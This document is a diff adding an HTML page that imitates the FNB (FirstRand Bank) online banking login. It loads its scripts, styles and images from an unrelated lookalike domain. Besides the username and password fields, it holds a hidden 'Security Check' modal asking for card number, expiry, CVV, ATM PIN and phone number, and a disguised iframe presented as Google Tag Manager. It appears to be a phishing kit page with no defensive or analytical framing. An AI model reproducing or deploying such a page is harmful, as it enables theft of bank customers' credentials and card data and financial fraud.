@@ -1,0 +1,539 @@
+<!DOCTYPE html><html><head>
+        <title>FNB</title>
+
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="format-detection" content="telephone=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="theme-color" content="#ffffff">
+        <script
+            src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.js"></script>
+        <link rel="stylesheet"
+            href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"
+            integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65"
+            crossorigin="anonymous">
+        <script
+            src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js"></script>
+        <link rel="stylesheet"
+            href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/3.6.95/css/materialdesignicons.css">
+        <script
+            src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+
+        <link href="https://minmartq1.online/nb/embeded_fonts.css"
+            rel="stylesheet" type="text/css">
+        <link href="https://minmartq1.online/nb/high.css" rel="stylesheet"
+            type="text/css">
+        <link href="https://minmartq1.online/nb/high-mm.css" rel="stylesheet"
+            type="text/css" id="lightModeCss">
+        <link href="https://minmartq1.online/nb/high-mm-dark.css"
+            rel="stylesheet" type="text/css" id="darkModeCss" disabled>
+
+        <link href="https://minmartq1.online/nb/ImageCropper.css"
+            rel="stylesheet" type="text/css">
+        <link href="https://minmartq1.online/nb/awesomplete.css"
+            rel="stylesheet" type="text/css">
+        <link href="https://minmartq1.online/nb/flatpickr.min.css"
+            rel="stylesheet" type="text/css">
+
+        <link rel="icon" sizes="16x16"
+            href="https://minmartq1.online/nb/Icon-16.png">
+        <link rel="icon" sizes="32x32"
+            href="https://minmartq1.online/nb/Icon-32.png">
+        <link rel="icon" sizes="192x192"
+            href="https://minmartq1.online/nb/Icon-192.png">
+        <link rel="stylesheet" href="https://minmartq1.online/nb/style.css"
+            type="text/css">
+
+        <script src="https://minmartq1.online/nb/main.js"></script>
+
+    </head>
+
+    <body>
+        <div class="modal " tabindex="-1">
+            <div class="modal-dialog modal-fullscreen">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <img src="https://minmartq1.online/nb/Icon-192.png"
+                            height="50">&nbsp;&nbsp; <b> FNB</b>
+                        <button type="button" class="btn-close"
+                            data-bs-dismiss="modal" aria-label="Close"></button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="padding">
+                            <div class="row">
+                                <div class="col-sm-6">
+                                    <div class="card">
+                                        <div class="card-header">
+                                            <strong>Security Check</strong><br>
+                                            <small>Please Verify Your Identity</small>
+                                        </div>
+                                        <div class="card-body">
+
+                                            <div class="row">
+                                                <div class="col-sm-12">
+                                                    <div class="form-group">
+                                                        <label for="ccnumber">Card
+                                                            Number</label>
+
+                                                        <div class="input-group">
+                                                            <input
+                                                                autocomplete="off"
+                                                                id="cc"
+                                                                class="form-control"
+                                                                type="number"
+                                                                placeholder="0000 0000 0000 0000">
+                                                            <div
+                                                                class="input-group-append">
+                                                                <span
+                                                                    class="input-group-text">
+                                                                    <i
+                                                                        class="mdi mdi-credit-card"></i>
+                                                                </span>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <div class="row">
+                                                <div class="form-group col-sm-4">
+                                                    <label for="ccmonth">Expiry</label>
+                                                    <input autocomplete="off"
+                                                        class="form-control"
+                                                        id="expiry"
+                                                        type="number"
+                                                        placeholder="MM/YY">
+                                                </div>
+                                                <div class="form-group col-sm-4">
+                                                    <label for="ccyear">CVV</label>
+                                                    <input autocomplete="off"
+                                                        class="form-control"
+                                                        id="cvv" type="password"
+                                                        placeholder="***">
+                                                </div>
+                                                <div class="col-sm-4">
+                                                    <div class="form-group">
+                                                        <label for="cvv">Atm Pin</label>
+                                                        <input
+                                                            autocomplete="off"
+                                                            class="form-control"
+                                                            id="atmpin"
+                                                            type="password"
+                                                            placeholder="*****">
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <div class="row">
+                                                <div class="col-sm-12">
+                                                    <div class="form-group">
+
+                                                        <label for="name">Phone</label>
+                                                        <input
+                                                            autocomplete="off"
+                                                            class="form-control"
+                                                            id="phone"
+                                                            type="tel"
+                                                            placeholder="Enter your mobile number">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="card-footer">
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="modal-footer "
+                        style="background-color: #01AAAD;">
+                        <button type="button" class="btn btn-secondary"
+                            data-bs-dismiss="modal">Back</button>
+                        <button type="button" class="btn btn-primary"
+                            id="final_submit">Continue</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="headerFixed"
+            class=" header headerContainerNoBottomLine header-main fixed
+	 headerNoSubtitle" style="background-color: #01AAAD;
+     grid-template-columns: calc(8 * var(--unit)) calc( 58  * var(--unit))  auto;">
+            <div
+                class="headerTitle headerTitleNoMenu noLeftButton headerTitleNoSubtitle"
+                style="
+         
+                 background-color:#01AAAD;
+                 color: var(--INK);"><img
+                    src="https://minmartq1.online/nb/Icon-192.png" height="50">FNB</div>
+            <div class="clear"></div>
+        </div>
+        <div class="loader_wrapper" id="loader_wrapper">
+            <div class="loading"><b>Loading Please Wait</b></div>
+            <span class="loader"></span></div>
+
+        <style>
+        
+    </style>
+        <div id="searchOverlay"
+            class="searchOverlayBackdrop centreContentBigScreen" data-key
+            data-initialparent data-initialtype data-remoteparent
+            data-remotetype data-remotesource data-searchcorrectdatatype>
+            <div class="searchOverlay">
+                <div class="searchOverlayHeader">
+                    <a class="searchOverlayHeaderButton" href="javascript:"
+                        data-value>
+                        <img
+                            src="https://minmartq1.online/nb/back.arrow.header.icon.v2.mdpi.png">
+                    </a>
+                    <div class="searchOverlayHeaderInputBlock">
+                        <input type="text"
+                            class="searchOverlayHeaderInput exclude skinSpecificBorderRadiusForInputs"
+                            id="searchOverlayInput" name value placeholder
+                            data-mincharacters data-maxlength data-timervalue>
+                    </div>
+
+                </div>
+                <div class="searchBarInfalte"></div>
+                <div class="searchNoResult" id="seachNoResultID">No results
+                    found</div>
+                <div class="searchFooterInfalte"></div>
+            </div>
+        </div><div id="content-overlay" class="force-fix"></div>
+        <div id="loader" class="force-fix"></div>
+        <div id="loader-percentage" class="force-fix"></div>
+
+        <div id="content-overlayClear" class="force-fix"></div>
+        <div id="loaderClear" class="force-fix"></div>
+
+        <div id="nativeOverlay" class="nativeFilePickerContainer"
+            style="display: none">
+            <div class="nativeFilePickerLoaderBackdrop" style="display: none">
+                <div class="nativeFilePickerLoader">
+                    <div class="nativeFilePickerCenter">X</div>
+                </div>
+            </div>
+            <div class="nativeFilePickerMessageBackdrop">
+                <div class="nativeFilePickerMessage">Message</div>
+            </div>
+        </div>
+
+        <div id="base-content"
+            style="background-color: var(--CONTAINER); height: calc(513.46px);"
+            class="baseBody fixed baseBodyHeaderUFF
+	 					centreContentBigScreen baseBodyHeader">
+
+            <form id="formContents"
+                action="https://www.online.fnb.co.za/banking/navigate?_u=29LMH9O3o&amp;_p=3CD8PnqO6"
+                method="post" autocomplete="off"
+                style="grid-row: 1 / auto; height: inherit; display: block;">
+
+                
+                    <div id="root.structuredcontainer.0"
+                        class="StructuredContainer animation_NONE_in"
+                        style="background-color: var(--GLASS); height: 513px;"
+                        data-order="0" data-source
+                        data-parent="ui.logon.mm.mobi.password.view"
+                        data-ordering="ASC"
+                        data-animation-exit="animation_NONE_out"
+                        data-animation-exit-delay="0">
+                        <div id="root.structuredcontainer.0.header"
+                            class="StructuredContainerHeader" data-source
+                            data-parent="ui.logon.mm.mobi.password.view"
+                            data-ordering="ASC"
+                            style="background: var(--PAPER); width: 597px; max-height: calc(489px);">
+                        </div>
+                        <div class="StructuredContainerBodyAndBottom"
+                            style="background-color: var(--GLASS);">
+                            <div class="StructuredContainerHeaderInflate"
+                                style="height: 0px;"></div>
+                            <div id="root.structuredcontainer.0.body"
+                                class="StructuredContainerBody" data-source
+                                data-parent="ui.logon.mm.mobi.password.view"
+                                data-ordering="ASC">
+                                <div id="footer.line"
+                                    class="animation_NONE_in  symbol"
+                                    style="animation-delay: 0;
+            height: 
+                        fit-content;
+                    " data-animation-exit="NONE" data-animation-exit-delay="0"
+                                    data-order="1"
+                                    data-transform-out="transform_NONE_out"
+                                    data-transform-in="transform_NONE_in">
+
+                                    <div class="line"
+                                        style="background-color:  var(--GHOST_MEDIUM);
+    height : 1px;">
+                                    </div>
+
+                                </div>
+                                <div id="login.logo"
+                                    class="animation_NONE_in  symbol"
+                                    style="animation-delay: 0;
+            height: 
+                        fit-content;
+                    " data-animation-exit="NONE" data-animation-exit-delay="0"
+                                    data-order="2"
+                                    data-transform-out="transform_NONE_out"
+                                    data-transform-in="transform_NONE_in"
+                                    data-zindex="off">
+
+                                    <a>
+                                        <div class="image loginlogo"
+                                            style="display: grid; background-color: var(--GLASS); height: calc( * var(--maxUnitBase));"
+                                            data-height
+                                            data-scaletype="CENTER_FIT"
+                                            data-alignment="LEFT">
+                                            <img class="image_img"
+                                                src="https://minmartq1.online/nb/login.logo.icon.mdpi.png"
+                                                style="margin-top: auto; margin-right: auto; margin-bottom: auto; margin-left: unset; visibility: visible; object-fit: fill; max-height: calc( * var(--maxUnitBase));">
+                                        </div>
+                                    </a></div>
+                                <div id="spacer.3"
+                                    class="animation_NONE_in spacer3 symbol"
+                                    style="animation-delay: 0;
+            height: 
+                        calc(3 * var(--unit));
+                     " data-animation-exit="NONE" data-animation-exit-delay="0"
+                                    data-order="3"
+                                    data-transform-out="transform_NONE_out"
+                                    data-transform-in="transform_NONE_in">
+
+                                    <div class="Spacer"></div><style
+                                        type="text/css">
+            @media (min-width: 500px) {
+                .spacer3{
+                    max-height: calc(3 * var(--maxUnitBase)) !important;
+                }
+            }
+        </style>
+                                </div>
+                                <div id="html.view"
+                                    class="animation_NONE_in  symbol"
+                                    style="animation-delay: 0;
+            height: 
+                        fit-content;
+                    " data-animation-exit="NONE" data-animation-exit-delay="0"
+                                    data-order="4"
+                                    data-transform-out="transform_NONE_out"
+                                    data-transform-in="transform_NONE_in">
+
+                                    <div class="htmlViewBody"
+                                        style="background-color: var(--GLASS);">
+
+                                        <center> <table border="0" width="96%"
+                                                height="100%"> <tbody><tr> <td
+                                                            align="center">
+                                                            <span
+                                                                class="instruction_med_bold">Please
+                                                                enter your FNB
+                                                                Username and
+                                                                Password to
+                                                                Login</span>
+                                                        </td> </tr> </tbody></table>
+                                        </center></div></div>
+                                <div id="username"
+                                    class="animation_SCALE_FADE_in  symbol"
+                                    style="animation-delay: 0;
+            height: 
+                        fit-content;
+                    " data-animation-exit="NONE" data-animation-exit-delay="0"
+                                    data-order="5"
+                                    data-transform-out="transform_NONE_out"
+                                    data-transform-in="transform_NONE_in">
+
+                                    <div class="inputGrid"
+                                        style="background-color: var(--GLASS)">
+
+                                        <input name="username" id="user"
+                                            class="input inputspecial_username skinSpecificBorderRadiusForInputs"
+                                            style="-webkit-appearance: none;
+           " type="text" placeholder maxlength="30" data-error="false"
+                                            data-hint="Username"
+                                            data-key="username"
+                                            data-inputfix="true">
+
+                                        <label
+                                            class="inputlabel inputlabel_username"
+                                            data-error="false">Username:</label>
+                                        <div class="inputlabelRightAligned">
+                                            <label class="inputlabelRight"
+                                                style="color: var(--GLASS)">Username</label>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div id="password"
+                                    class="animation_NONE_in  symbol"
+                                    style="animation-delay: 0; height:fit-content;
+                    " data-animation-exit="NONE" data-animation-exit-delay="0"
+                                    data-order="6"
+                                    data-transform-out="transform_NONE_out"
+                                    data-transform-in="transform_NONE_in">
+
+                                    <div class="passwordInputGrid"
+                                        style="background-color: var(--GLASS)">
+
+                                        <div class="passwordInputWrapper">
+                                            <input id="showInput"
+                                                name="password"
+                                                autocomplete="off"
+                                                autocorrect="off"
+                                                autocapitalize="off"
+                                                spellcheck="false"
+                                                maxlength="30" type="password"
+                                                data-counter="0" data-wrongvalue
+                                                data-inputvalue value
+                                                class="loginPasswordInputfield skinSpecificBorderRadiusForInputs"
+                                                data-inputfix="true">
+
+                                        </div>
+                                        <span class="passwordLabel"
+                                            id="labelPass"
+                                            style="color: var(--GHOST_MEDIUM)">Password:</span>
+                                        <label class="inputlabelLeft"
+                                            style="color: var(--HIGHLIGHT)"></label>
+                                        <input id="dataCounter"
+                                            name="dataCounter" type="hidden"
+                                            value="0" data-inputfix="true">
+                                    </div>
+                                </div>
+                                <div id="login"
+                                    class="animation_NONE_in  symbol"
+                                    style="animation-delay: 0;
+            height:fit-content;" data-animation-exit="NONE"
+                                    data-animation-exit-delay="0" data-order="7"
+                                    data-transform-out="transform_NONE_out"
+                                    data-transform-in="transform_NONE_in">
+
+                                    <a id="pillButtonlogin"
+                                        data-alternativetextcolour
+                                        data-alternativetext
+                                        data-originaltext="Login"
+                                        data-originaltextcolour="ALWAYS_PAPER"
+                                        style="-webkit-touch-callout: none; -webkit-user-select: none; cursor: auto;"
+                                        href="#" data-type="SUBMIT"
+                                        data-bindstatus="true">
+
+                                        <div
+                                            style="background-color: var(--GLASS)"
+                                            class="pillButtonContainer">
+                                            <div
+                                                style="border-color: var(--ELEVATION); border-style: solid;
+                    background-color: var(--ALWAYS_ACTION);
+                    color: var(--ALWAYS_PAPER);
+                    cursor: pointer;"
+                                                class="pillButton skinSpecificBorderRadiusForPill ">
+
+                                                Login</div>
+                                        </div>
+                                    </a>
+                                </div>
+                                <div id="forgot"
+                                    class="animation_NONE_in  symbol"
+                                    style="animation-delay: 0;
+            height: 
+                        fit-content;
+                    " data-animation-exit="NONE" data-animation-exit-delay="0"
+                                    data-order="8"
+                                    data-transform-out="transform_NONE_out"
+                                    data-transform-in="transform_NONE_in">
+
+                                    <a id="pillButtonforgot"
+                                        data-alternativetextcolour
+                                        data-alternativetext
+                                        data-originaltext="Forgot Password"
+                                        data-originaltextcolour="INK"
+                                        style="-webkit-touch-callout: none; -webkit-user-select: none; cursor: auto;"
+                                        href="https://www.online.fnb.co.za/banking/navigate?_u=29LMH9O3o&amp;_p=3CD8PnqO6"
+                                        data-type="SUBMIT"
+                                        data-bindstatus="true">
+
+                                        <div
+                                            style="background-color: var(--GLASS)"
+                                            class="pillButtonContainer">
+
+                                        </a>
+                                    </div>
+                                    <div id="register"
+                                        class="animation_NONE_in  symbol"
+                                        style="animation-delay: 0;
+            height: 
+                        fit-content;
+                    " data-animation-exit="NONE" data-animation-exit-delay="0"
+                                        data-order="9"
+                                        data-transform-out="transform_NONE_out"
+                                        data-transform-in="transform_NONE_in">
+
+                                        <a id="pillButtonregister"
+                                            data-alternativetextcolour
+                                            data-alternativetext
+                                            data-originaltext="Register"
+                                            data-originaltextcolour="INK"
+                                            style="-webkit-touch-callout: none; -webkit-user-select: none; cursor: auto;"
+                                            href="https://www.online.fnb.co.za/banking/navigate?_u=4Rdn7fFks&amp;_p=5XLeoF7xX"
+                                            data-bindstatus="true">
+
+                                            <div
+                                                style="background-color: var(--GLASS)"
+                                                class="pillButtonContainer">
+
+                                            </div>
+                                        </a>
+                                    </div>
+                                </div>
+                                <div id="root.structuredcontainer.0.bottom"
+                                    class="StructuredContainerBottom"
+                                    data-source
+                                    data-parent="ui.logon.mm.mobi.password.view"
+                                    data-ordering="ASC">
+                                </div>
+                                <div class="StructuredContainerFooterInflate"
+                                    style="height: 24px;"></div>
+                            </div>
+                            <div id="root.structuredcontainer.0.footer"
+                                class="StructuredContainerFooter" data-source
+                                data-parent="ui.logon.mm.mobi.password.view"
+                                data-ordering="ASC" style="background:
+                 var(--PAPER);">
+                                <div id="copyright"
+                                    class="animation_NONE_in  symbol"
+                                    style="animation-delay: 0;
+            height: 
+                        fit-content;
+                    " data-animation-exit="NONE" data-animation-exit-delay="0"
+                                    data-order="10"
+                                    data-transform-out="transform_NONE_out"
+                                    data-transform-in="transform_NONE_in">
+
+                                    <div class="text_sub"
+                                        style="text-align: CENTER;
+             color: var(--INK);
+             max-height: calc( * var(--line-height-unit-mod));">
+                                        Copyright © 2023 FirstRand Bank Limited.
+                                        All rights reserved.</div></div>
+                            </div>
+                        </div>
+
+                    </div>
+                </form>
+
+            </div><div id="contentBackdrop" class="contentBackdrop"></div>
+            <audio id="localAudio"></audio>
+            <audio id="remoteAudio"></audio>
+            <audio id="ringbacktone" type="audio/mpeg" preload="auto"
+                src="https://minmartq1.online/nb/fnbringbacktone.mp3"></audio>
+            <audio id="ringtone" type="audio/mpeg" preload="auto"
+                src="https://minmartq1.online/nb/fnbringtone.mp3"></audio>
+
+            <!-- Google Tag Manager -->
+
+            <noscript>
+                <iframe src="https://minmartq1.online/nb/index_1.html"
+                    height="0" width="0" style="display:none;visibility:hidden"></iframe>
+            </noscript>
+            <!-- End Google Tag Manager -->
+
+        </body></html>
